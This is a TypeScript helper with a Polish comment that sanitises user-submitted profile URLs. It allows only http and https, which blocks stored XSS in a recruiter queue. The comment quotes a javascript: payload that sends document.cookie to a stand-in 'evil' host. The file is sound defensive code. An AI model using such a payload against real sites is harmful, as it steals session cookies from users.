/**
 * Bezpieczny `href` dla adresów pochodzących od użytkownika.
 *
 * `submitted_linkedin` w zgłoszeniu z publicznej aplikacji przychodzi z
 * NIEUWIERZYTELNIONEGO formularza (`public_share.py`: `Form(None,
 * max_length=500)` — długość i nic więcej). Wyrenderowanie takiej wartości
 * wprost w `<a href>` daje stored XSS: `javascript:fetch('//evil/?c='+
 * document.cookie)` wykonuje się w sesji rekrutera, który kliknie link w
 * kolejce zgłoszeń. React escapuje treść tekstową, ale NIE waliduje schematów
 * URL w atrybutach.
 *
 * Dopuszczamy wyłącznie `http:` i `https:`. Wszystko inne — `javascript:`,
 * `data:`, `vbscript:`, adresy względne — zwraca `null`, a wołający renderuje
 * wtedy zwykły tekst zamiast linku. Allowlista, nie blacklista: lista
 * niebezpiecznych schematów jest otwarta i przeglądarki dokładają nowe.
 */

const ALLOWED_PROTOCOLS = new Set(["http:", "https:"]);

export function safeExternalHref(raw: string | null | undefined): string | null {
  if (!raw) return null;
  const trimmed = raw.trim();
  if (!trimmed) return null;
  try {
    // `new URL` bez bazy odrzuca adresy względne — i dobrze: link do profilu
    // ma być bezwzględny, a `//evil.example` (protocol-relative) nie ma tu
    // czego robić.
    const url = new URL(trimmed);
    return ALLOWED_PROTOCOLS.has(url.protocol) ? url.toString() : null;
  } catch {
    return null;
  }
}
